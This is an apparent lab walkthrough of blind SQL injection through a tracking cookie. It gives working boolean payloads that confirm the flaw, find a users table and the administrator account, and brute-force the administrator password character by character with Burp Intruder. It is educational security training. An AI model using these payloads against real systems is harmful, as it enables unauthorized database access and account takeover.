SQL Injection:  Bling SQL Injection with conditional responses
Vulnerable Parameter: Tracking cookie

Since no error messages are explicitly displayed, we cant use UNION queries

End Goals:

- Enumerate administrator password
- Login as the administrator user

ANALYSIS
-----------

- You first need to fuzz the application with a true use case and then a false use case then compare the responses
- You will then be able to infer

1. Confirm that the parameter is Vulnerable to blind SQLi

Let's imagine the backend database query to be as follows:

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ'

-> If the tracking id exists => query returns a "Welcome back!" message
-> If tracking id doesn't exist => query returns nothing - No Welcome back message

Let's now modify our query to evaluate the use cases

TRUE USE CASE
---------------

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ' and 1=1--'

-> We get a "Welcome back!" message

FALSE USE CASE
---------------

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ' and 1=0--'

-> No welcome back message

2. We will now confirm if a users table exists - by sending the application TRUE or FALSE queries

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ' and (select 'x' from users LIMIT 1)='x'--'

-> We get a welcome back message => Users table exists in the database

3. We now need to confirm that the username "administrator" exists in the users table

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ' and (select username from users where username = 'administrator')='administrator'--'

-> We get a welcome back message => Administrator user exists

4. Enumerate the password of the administrator user

- We will need to determine the password one character at a time by asking the database TRUE/FALSE questions
- First determine the password length

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ' and (select username from users where username = 'administrator' and LENGTH(password)>1)='administrator'--'

We can try to fast rack this using Burp intruder

-> Password is 20 characters long

5. We can enumerate the password characters - we will use Burp intruder for this as well

select trackingId from tracking-table where trackingId = 'gs9xbeo8MIOPh1jZ' and (select substring(password,1,1) from users where username = 'administrator')='a'--'

-> We do not get a welcome message back => Means the first character of the admin password is not "a"

We will now use Burp intruder to fuzz with the other alphanumeric characters - use bruteforcer payload

p => First character of the admin password

To quicken the process we will use the attack on burp intruder - Takes some time

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
                b                   a

This can be done much faster using a Python script.


